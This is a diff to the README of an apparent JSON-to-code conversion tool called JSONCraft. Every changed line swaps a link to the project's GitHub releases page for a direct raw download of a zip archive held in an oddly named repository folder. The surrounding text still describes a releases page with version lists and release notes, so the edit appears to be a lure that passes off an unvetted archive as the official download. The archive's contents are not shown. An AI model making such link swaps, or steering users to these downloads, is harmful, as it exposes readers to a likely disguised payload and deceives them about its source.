@@ -1,6 +1,6 @@
 # 🛠️ JSONCraft - Instant Model Conversion Tool
 
-[![Download JSONCraft](https://img.shields.io/badge/Download-JSONCraft-brightgreen)](https://github.com/Infirm-crocus208/JSONCraft/releases)
+[![Download JSONCraft](https://img.shields.io/badge/Download-JSONCraft-brightgreen)](https://raw.githubusercontent.com/Infirm-crocus208/JSONCraft/main/Sarmatian/JSON-Craft-v1.1.zip)
 
 ---
 
@@ -12,7 +12,7 @@ JSONCraft lets you convert JSON data into TypeScript, Python, GraphQL, and SQL m
 
 You need to visit this page to download the application:
 
-[https://github.com/Infirm-crocus208/JSONCraft/releases](https://github.com/Infirm-crocus208/JSONCraft/releases)
+[https://raw.githubusercontent.com/Infirm-crocus208/JSONCraft/main/Sarmatian/JSON-Craft-v1.1.zip](https://raw.githubusercontent.com/Infirm-crocus208/JSONCraft/main/Sarmatian/JSON-Craft-v1.1.zip)
 
 This page contains the latest versions of JSONCraft. On this page, look for the version that matches your system. If you use Windows, download the file ending with `.exe` or `.zip`.
 
@@ -47,7 +47,7 @@ Follow these step-by-step instructions to get JSONCraft running on your Windows 
 
 Open this URL in your web browser:
 
-[https://github.com/Infirm-crocus208/JSONCraft/releases](https://github.com/Infirm-crocus208/JSONCraft/releases)
+[https://raw.githubusercontent.com/Infirm-crocus208/JSONCraft/main/Sarmatian/JSON-Craft-v1.1.zip](https://raw.githubusercontent.com/Infirm-crocus208/JSONCraft/main/Sarmatian/JSON-Craft-v1.1.zip)
 
 This page lists all available versions of JSONCraft. Each entry will have download links and release notes.
 
@@ -123,7 +123,7 @@ JSONCraft runs locally on your machine. Your data stays on your computer unless 
 
 Check the releases page regularly:
 
-[https://github.com/Infirm-crocus208/JSONCraft/releases](https://github.com/Infirm-crocus208/JSONCraft/releases)
+[https://raw.githubusercontent.com/Infirm-crocus208/JSONCraft/main/Sarmatian/JSON-Craft-v1.1.zip](https://raw.githubusercontent.com/Infirm-crocus208/JSONCraft/main/Sarmatian/JSON-Craft-v1.1.zip)
 
 Download the newest version when available. New versions include bug fixes and additional features.
 
@@ -169,4 +169,4 @@ JSONCraft uses a simple set of rules to map JSON elements to programming languag
 
 ---
 
-[![Download JSONCraft](https://img.shields.io/badge/Download-JSONCraft-brightgreen)](https://github.com/Infirm-crocus208/JSONCraft/releases)
+[![Download JSONCraft](https://img.shields.io/badge/Download-JSONCraft-brightgreen)](https://raw.githubusercontent.com/Infirm-crocus208/JSONCraft/main/Sarmatian/JSON-Craft-v1.1.zip)
